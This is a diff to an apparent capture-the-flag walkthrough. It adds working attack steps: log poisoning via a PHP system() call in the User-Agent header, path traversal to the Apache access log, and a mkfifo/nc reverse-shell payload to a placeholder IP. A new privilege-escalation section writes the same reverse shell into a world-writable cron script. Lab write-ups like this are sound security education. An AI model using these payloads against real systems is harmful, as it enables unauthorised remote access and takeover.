@@ -64,16 +64,36 @@ When you send the request for the first time, you won't see anything in the outp
 
 start of the malicious burp request looks 
 ```
-GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=wget%20http://10.8.**.**:8000/rev.php HTTP/1.1
+GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f HTTP/1.1
 Host: mafialive.thm
 User-Agent: <?php system($_GET['cmd']); ?>
 ```
+remember to url encode the revshell payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f`
 
 call the reverse shell on the server by browsing `http://mafialive.thm/rev.php` We now have a reverse shell:
 ```sh
 rlwrap nc -nlvp 4444
 ```
 
+### Horizontal Privilege Escalation
+
+searching the machine doesn't reveal anything good, so search for cronjobs using `cat /etc/crontab`
+
+Here, we can see that a shell script named as `helloworld.sh` in the `/opt` directory is being executed as user archangel. We can check the permissions of that file and try to use it to gain access to the system as user archangel.
+
+```shell
+www-data@ubuntu:/home/archangel/myfiles$ cat helloworld.sh
+cat helloworld.sh
+#!/bin/bash
+echo "hello world" >> /opt/backupfiles/helloworld.txt
+```
+
+From the output, we can see that all the `rwx` permissions are given to others. So, we can edit this file, add a payload in the bash script to create a reverse shell as user archangel. For this we can again use the same payload but change the port number
+
+```shell
+www-data@ubuntu:/opt$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4445 >/tmp/f" > /opt/helloworld.sh
+```
+### Privesc
 
 
 
